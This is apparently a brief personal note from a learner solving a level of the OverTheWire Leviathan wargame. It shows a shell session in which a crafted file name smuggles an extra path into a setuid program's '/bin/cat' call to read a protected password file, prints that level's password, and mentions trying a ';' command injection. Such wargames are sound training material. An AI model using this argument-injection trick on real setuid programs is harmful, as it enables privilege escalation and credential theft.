This link again helped me:

https://jhalon.github.io/over-the-wire-leviathan/

leviathan2@leviathan:/tmp/cool_tmp$ ~/printfile "./my_dir /etc/leviathan_pass/leviathan3"
/bin/cat: ./my_dir: No such file or directory
Ahdiemoo1j
leviathan2@leviathan:/tmp/cool_tmp$ pwd
/tmp/cool_tmp
leviathan2@leviathan:/tmp/cool_tmp$

I was able to decompile this code also. I knew the fault had to be with
"/bin/cat %s" but I tried to see if I could insert multiple commands with a
cmd-line arg of "; /etc/leviathan_pass/leviathan3"

These leviathan labs are tough.
